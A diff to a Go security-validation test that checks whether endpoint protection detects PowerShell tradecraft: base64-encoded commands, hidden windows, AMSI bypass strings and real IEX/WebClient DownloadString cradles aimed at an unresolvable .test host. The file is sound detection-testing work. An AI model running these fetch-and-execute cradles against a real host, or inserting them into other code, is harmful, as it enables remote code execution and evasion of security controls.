@@ -12,6 +12,7 @@ COMPLEXITY: medium
 THREAT_ACTOR: N/A
 SUBCATEGORY: execution
 TAGS: powershell, amsi, obfuscation, command-line
+SOURCE_URL: https://top-attack-techniques.mitre-engenuity.org/
 UNIT: response
 CREATED: 2026-01-11
 AUTHOR: sectest-builder
@@ -29,15 +30,17 @@ import (
 	"time"
 
 	"github.com/google/uuid"
-	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
 	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
-	"golang.org/x/sys/windows"
 )
 
 const (
 	TEST_UUID  = "f3d7a2b1-8c4e-4f5a-9d6b-1e2f3a4b5c01"
 	TEST_NAME  = "PowerShell Execution & AMSI Detection"
 	TARGET_DIR = "c:\\F0"
+
+	// ExitTestError is the framework test-error exit code. The vendored prelude
+	// endpoint lib maps UnexpectedTestError to exit 1 — do not use it (CLAUDE.md).
+	ExitTestError = 999
 )
 
 // PowerShell test patterns - all designed to be safe and create marker files only
@@ -46,8 +49,14 @@ var (
 	// Command: New-Item -Path c:\F0\marker_encoded.txt -ItemType File -Value 'F0RT1KA-Base64-Test' -Force
 	base64TestCommand = "TgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAYwA6AFwARgAwAFwAbQBhAHIAawBlAHIAXwBlAG4AYwBvAGQAZQBkAC4AdAB4AHQAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEYAaQBsAGUAIAAtAFYAYQBsAHUAZQAgACcARgAwAFIAVAAxAEsAQQAtAEIAYQBzAGUANgA0AC0AVABlAHMAdAAnACAALQBGAG8AcgBjAGUA"
 
-	// Pattern 2: Download cradle simulation (harmless - creates marker only)
-	downloadCradleCommand = `$marker = "F0RT1KA-DownloadCradle-Simulation"; $marker | Out-File -FilePath "c:\F0\marker_download.txt" -Force`
+	// Pattern 2: REAL download-cradle patterns (Batch B realism upgrade).
+	// The host is a reserved-TLD (.test) domain that never resolves: the tradecraft
+	// signal is the authentic cradle command line/AMSI content + DNS attempt, not
+	// payload retrieval. Safe by construction.
+	cradleHost       = "http://cdn-updates.f0rtika-lab.test/p.ps1"
+	cradleSentinel   = "F0RT1KA-Cradle-Invoked"
+	downloadCradleIEX = fmt.Sprintf(`try { IEX (New-Object Net.WebClient).DownloadString('%s') } catch {}; Write-Output '%s'`, cradleHost, cradleSentinel)
+	downloadCradleWC  = fmt.Sprintf(`$c = New-Object System.Net.WebClient; try { $c.DownloadString('%s') } catch {}; Write-Output '%s'`, cradleHost, cradleSentinel)
 
 	// Pattern 3: Hidden window execution command
 	hiddenWindowCommand = `New-Item -Path c:\F0\marker_hidden.txt -ItemType File -Value 'F0RT1KA-Hidden-Window-Test' -Force`
@@ -61,6 +70,26 @@ var (
 		"System.Management.Automation.AmsiUtils",
 	}
 )
+
+// isPositiveProtectionEvidence returns true ONLY for exact, security-product- or
+// OS-emitted denial markers in the child's output (Bug Prevention Rule 8: absence
+// of success is not evidence of a block; generic words like "denied" appearing
+// anywhere in output are NOT evidence).
+func isPositiveProtectionEvidence(output string) bool {
+	markers := []string{
+		"Access is denied",                                                    // canonical OS denial
+		"running scripts is disabled",                                         // PowerShell execution-policy block
+		"script contains malicious content",                                   // AMSI scan detection
+		"Operation did not complete successfully because the file contains a virus", // AV acted on the script
+		"This program is blocked by group policy",                             // AppLocker/GPO software restriction
+	}
+	for _, m := range markers {
+		if strings.Contains(output, m) {
+			return true
+		}
+	}
+	return false
+}
 
 // checkPowerShellAvailable verifies PowerShell is available on the system
 func checkPowerShellAvailable() bool {
@@ -89,13 +118,9 @@ func executeBase64EncodedCommand() (bool, bool, string) {
 		errorStr := err.Error()
 		outputStr := string(output)
 
-		// Check for EDR/AV blocking indicators
-		if strings.Contains(outputStr, "blocked") ||
-			strings.Contains(outputStr, "denied") ||
-			strings.Contains(outputStr, "prevented") ||
-			errors.Is(err, windows.ERROR_ACCESS_DENIED) || strings.Contains(errorStr, "Access is denied") ||
-			strings.Contains(errorStr, "not recognized") {
-			LogProcessExecution("powershell.exe", cmdLine, pid, false, 126, "Blocked by security controls")
+		// Block classification ONLY on exact security-product/OS denial markers
+		if isPositiveProtectionEvidence(outputStr) || isPositiveProtectionEvidence(errorStr) {
+			LogProcessExecution("powershell.exe", cmdLine, pid, false, 126, "Blocked by security controls (positive evidence)")
 			return false, true, fmt.Sprintf("Blocked: %s", errorStr)
 		}
 
@@ -119,49 +144,66 @@ func executeBase64EncodedCommand() (bool, bool, string) {
 	return false, false, "Command executed but marker file not created"
 }
 
-// executeDownloadCradle simulates a download cradle pattern
+// executeDownloadCradle executes REAL download-cradle command lines
+// (IEX/DownloadString + WebClient variants against a reserved-TLD host that
+// never resolves — authentic cradle telemetry, no payload retrieval).
 // Returns: success, blocked, errorMsg
 func executeDownloadCradle() (bool, bool, string) {
-	Endpoint.Say("  Simulating download cradle pattern (harmless marker creation)...")
+	Endpoint.Say("  Executing real download cradle patterns (reserved-TLD host, no payload)...")
 
-	// Note: This doesn't actually download anything - it creates a marker file
-	// The pattern simulates IEX (New-Object Net.WebClient).DownloadString behavior
-	cmdLine := "Download cradle simulation pattern"
-	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", downloadCradleCommand)
+	for name, cradleCmd := range map[string]string{
+		"IEX DownloadString cradle": downloadCradleIEX,
+		"WebClient DownloadString":  downloadCradleWC,
+	} {
+		cmdLine := fmt.Sprintf("powershell.exe -ExecutionPolicy Bypass -Command \"%s\"", cradleCmd)
+		cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", cradleCmd)
 
-	output, err := cmd.CombinedOutput()
-
-	pid := 0
-	if cmd.Process != nil {
-		pid = cmd.Process.Pid
-	}
-
-	if err != nil {
-		errorStr := err.Error()
+		output, err := cmd.CombinedOutput()
 		outputStr := string(output)
 
-		// Check for blocking
-		if strings.Contains(outputStr, "blocked") ||
-			strings.Contains(outputStr, "denied") ||
-			errors.Is(err, windows.ERROR_ACCESS_DENIED) || strings.Contains(errorStr, "Access is denied") {
-			LogProcessExecution("powershell.exe", cmdLine, pid, false, 126, "Blocked by security controls")
-			return false, true, fmt.Sprintf("Blocked: %s", errorStr)
+		pid := 0
+		if cmd.Process != nil {
+			pid = cmd.Process.Pid
 		}
 
-		LogProcessExecution("powershell.exe", cmdLine, pid, false, 1, errorStr)
-		return false, false, errorStr
+		LogProcessExecution("powershell.exe", cmdLine, pid, err == nil, exitCodeOf(err), outputSummary(outputStr))
+
+		if isPositiveProtectionEvidence(outputStr) {
+			LogMessage("INFO", "Download Cradle", fmt.Sprintf("%s: blocked (positive protection evidence)", name))
+			return false, true, fmt.Sprintf("Blocked: %s", name)
+		}
+
+		// Sentinel present => the cradle syntax itself executed under PowerShell;
+		// DNS/retrieval failure to the reserved-TLD host is expected-benign.
+		if strings.Contains(outputStr, cradleSentinel) {
+			LogMessage("INFO", "Download Cradle", fmt.Sprintf("%s: cradle pattern executed (host intentionally unresolvable)", name))
+			return true, false, ""
+		}
+		_ = err
 	}
 
-	// Check if marker file was created
-	markerPath := filepath.Join(TARGET_DIR, "marker_download.txt")
-	if _, err := os.Stat(markerPath); err == nil {
-		LogProcessExecution("powershell.exe", cmdLine, pid, true, 0, "")
-		LogFileDropped("marker_download.txt", markerPath, 0, false)
-		return true, false, ""
-	}
+	return false, false, "cradle patterns did not execute"
+}
 
-	LogProcessExecution("powershell.exe", cmdLine, pid, false, 1, "Marker file not created")
-	return false, false, "Command executed but marker file not created"
+// exitCodeOf maps a cmd error to a numeric exit status for logging
+func exitCodeOf(err error) int {
+	if err == nil {
+		return 0
+	}
+	var exitErr *exec.ExitError
+	if errors.As(err, &exitErr) {
+		return exitErr.ExitCode()
+	}
+	return 1
+}
+
+// outputSummary returns the first line(s) of child output for the log
+func outputSummary(s string) string {
+	s = strings.TrimSpace(s)
+	if len(s) > 200 {
+		return s[:200] + "..."
+	}
+	return s
 }
 
 // executeHiddenWindow executes PowerShell with hidden window
@@ -186,10 +228,8 @@ func executeHiddenWindow() (bool, bool, string) {
 		errorStr := err.Error()
 		outputStr := string(output)
 
-		if strings.Contains(outputStr, "blocked") ||
-			strings.Contains(outputStr, "denied") ||
-			errors.Is(err, windows.ERROR_ACCESS_DENIED) || strings.Contains(errorStr, "Access is denied") {
-			LogProcessExecution("powershell.exe", cmdLine, pid, false, 126, "Blocked by security controls")
+		if isPositiveProtectionEvidence(outputStr) || isPositiveProtectionEvidence(errorStr) {
+			LogProcessExecution("powershell.exe", cmdLine, pid, false, 126, "Blocked by security controls (positive evidence)")
 			return false, true, fmt.Sprintf("Blocked: %s", errorStr)
 		}
 
@@ -224,14 +264,25 @@ func testAMSIBypassPatternDetection() (int, string) {
 		testCmd := fmt.Sprintf(`$testVar = "%s"; Write-Output "Pattern test: $testVar" | Out-Null`, pattern)
 
 		cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", testCmd)
-		err := cmd.Run()
+		output, err := cmd.CombinedOutput()
+		outputStr := string(output)
 
-		if err != nil {
-			// Pattern was likely detected/blocked
+		pid := 0
+		if cmd.Process != nil {
+			pid = cmd.Process.Pid
+		}
+
+		// Detection ONLY on explicit AMSI/policy action text in output — a bare
+		// non-zero exit of powershell.exe is NOT evidence of detection.
+		if isPositiveProtectionEvidence(outputStr) {
 			patternsDetected++
-			details = append(details, fmt.Sprintf("Pattern '%s' detected", pattern))
-			LogMessage("INFO", "AMSI Pattern Detection", fmt.Sprintf("Pattern blocked: %s", pattern))
+			details = append(details, fmt.Sprintf("Pattern '%s' detected (explicit AMSI/policy action text)", pattern))
+			LogProcessExecution("powershell.exe", testCmd, pid, false, exitCodeOf(err), "AMSI/policy detection evidence")
+		} else if err != nil {
+			LogProcessExecution("powershell.exe", testCmd, pid, false, exitCodeOf(err), "exited non-zero without detection evidence (not counted)")
+			LogMessage("WARN", "AMSI Pattern Detection", fmt.Sprintf("Pattern '%s': powershell exited non-zero without detection evidence — not counted as detected", pattern))
 		} else {
+			LogProcessExecution("powershell.exe", testCmd, pid, true, 0, "executed, no detection")
 			LogMessage("WARN", "AMSI Pattern Detection", fmt.Sprintf("Pattern not blocked: %s", pattern))
 		}
 	}
@@ -279,8 +330,10 @@ func test() {
 		if r := recover(); r != nil {
 			if globalLog != nil {
 				LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
-				SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Panic: %v", r))
+				SaveLog(ExitTestError, fmt.Sprintf("Panic: %v", r))
 			}
+			cleanup()
+			Endpoint.Stop(ExitTestError)
 		}
 	}()
 
@@ -292,27 +345,23 @@ func test() {
 	LogPhaseStart(1, "Initialization")
 	Endpoint.Say("Phase 1: Initializing test environment")
 
-	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
-		LogPhaseError(0, fmt.Sprintf("Dropper initialization failed: %v", err))
-		LogPhaseEnd(0, "failed", "Dropper initialization failed")
-		SaveLog(Endpoint.UnexpectedTestError, "Dropper initialization failed")
-		Endpoint.Stop(Endpoint.UnexpectedTestError)
-	}
+	// NOTE: Endpoint.Dropper call removed — it dropped an unused binary into CWD
+	// on every run and was never executed (audit 2026-11-03).
 
 	// Create target directory
 	if err := os.MkdirAll(TARGET_DIR, 0755); err != nil {
 		LogPhaseError(0, fmt.Sprintf("Failed to create target directory: %v", err))
 		LogPhaseEnd(0, "failed", "Failed to create target directory")
-		SaveLog(Endpoint.UnexpectedTestError, "Failed to create target directory")
-		Endpoint.Stop(Endpoint.UnexpectedTestError)
+		SaveLog(ExitTestError, "Failed to create target directory")
+		Endpoint.Stop(ExitTestError)
 	}
 
 	// Check PowerShell availability
 	if !checkPowerShellAvailable() {
 		LogMessage("ERROR", "Initialization", "PowerShell is not available on this system")
 		LogPhaseEnd(0, "failed", "PowerShell not available")
-		SaveLog(999, "PowerShell not available on system")
-		Endpoint.Stop(999) // Exit code 999 for prerequisites not met
+		SaveLog(ExitTestError, "PowerShell not available on system")
+		Endpoint.Stop(ExitTestError) // Exit code 999 for prerequisites not met
 	}
 
 	LogMessage("INFO", "Initialization", "PowerShell verified available")
@@ -471,9 +520,9 @@ Assessment:
 		// Edge case - no clear result
 		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Test did not produce clear results")
 		LogMessage("WARN", "Final Assessment", "Test inconclusive")
-		SaveLog(Endpoint.UnexpectedTestError, "Test inconclusive - no clear result")
+		SaveLog(ExitTestError, "Test inconclusive - no clear result")
 		cleanup()
-		Endpoint.Stop(Endpoint.UnexpectedTestError) // Exit 1
+		Endpoint.Stop(ExitTestError) // Exit 999
 	}
 }
 
@@ -562,6 +611,7 @@ func main() {
 			LogMessage("ERROR", "Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
 			SaveLog(Endpoint.TimeoutExceeded, fmt.Sprintf("Test exceeded timeout of %v", timeout))
 		}
+		cleanup()
 		Endpoint.Stop(Endpoint.TimeoutExceeded)
 	}
 }
